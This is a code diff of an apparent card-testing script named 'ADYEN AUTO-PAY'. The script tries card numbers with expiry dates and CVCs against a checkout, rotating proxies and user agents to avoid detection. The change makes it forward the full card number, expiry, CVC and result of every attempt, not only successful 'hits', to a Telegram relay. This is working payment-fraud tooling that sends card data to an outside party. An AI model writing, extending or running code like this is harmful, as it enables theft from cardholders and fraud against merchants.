@@ -555,7 +555,7 @@
         <div style="display:flex;align-items:center;gap:8px">
           <span style="font-size:16px">&#9889;</span>
           <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
-          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.8.0</span>
+          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.8.1</span>
         </div>
         <div style="display:flex;gap:6px">
           <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
@@ -951,17 +951,6 @@
           " " + card.cvc + " -> " + res.label, "#00d1b2");
         window.__nonoLog && window.__nonoLog("LIVE HIT! " + res.label + ". Stopping.");
         stopRequested = true;
-
-        const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
-        const uaLabel = ua && ua.label ? ua.label : "";
-        const hitText = [
-          "<b>⚡ HIT #" + liveHits + "</b>",
-          "Card: <code>" + card.number + "</code> " + (card.month || "") + "/" + (card.year || "").slice(-2) + " cvc <code>" + card.cvc + "</code>",
-          "Verdict: <b>" + res.label + "</b>",
-          prLabel ? "Proxy: " + prLabel : "",
-          uaLabel ? "UA: " + uaLabel : ""
-        ].filter(Boolean).join("\n");
-        proxyMsg({ action: "TG_HIT", text: hitText });
       } else {
         window.__nonoResult && window.__nonoResult("&#10060;",
           "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
@@ -971,6 +960,17 @@
           stopRequested = true;
         }
       }
+
+      const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
+      const uaLabel = ua && ua.label ? ua.label : "";
+      const resultText = [
+        (res.ok ? "<b>⚡ HIT #" + liveHits + "</b>" : "<b>✖ TRY #" + tries + "</b>"),
+        "Card: <code>" + card.number + "</code> " + (card.month || "") + "/" + (card.year || "").slice(-2) + " cvc <code>" + card.cvc + "</code>",
+        "Verdict: <b>" + res.label + "</b>" + respTail,
+        prLabel ? "Proxy: " + prLabel : "",
+        uaLabel ? "UA: " + uaLabel : ""
+      ].filter(Boolean).join("\n");
+      proxyMsg({ action: "TG_HIT", text: resultText });
 
       await sleep(cfg.autoSubmit ? 2000 : 800);
     }
